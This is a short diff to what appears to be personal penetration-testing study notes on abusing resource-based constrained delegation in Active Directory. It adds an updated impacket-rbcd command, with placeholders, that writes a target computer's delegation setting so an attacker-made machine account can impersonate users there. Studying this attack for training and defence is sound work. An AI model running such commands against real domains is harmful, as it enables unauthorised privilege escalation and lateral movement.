@@ -16,6 +16,9 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
 2. Add the fake machine account to the target computers trust list. (Possible because we have GenericalAll)
   ```bash
   impacket-rbcd -dc-ip <DC IP> -t <Target Computer hostname> -f <fakemachine hostname> <domain>/<controlled username>:<controlled password>
+
+  # This command has changed from the training material. New command is 
+  impacket-rbcd -dc-ip <DC IP> -delegate-to "<Target Computer Hostname>" -delegate-from "<FakeMachine hostname>" -action write <domain>/<owned user>:<password> 
   ```
 3. Get the Target
   ```bash
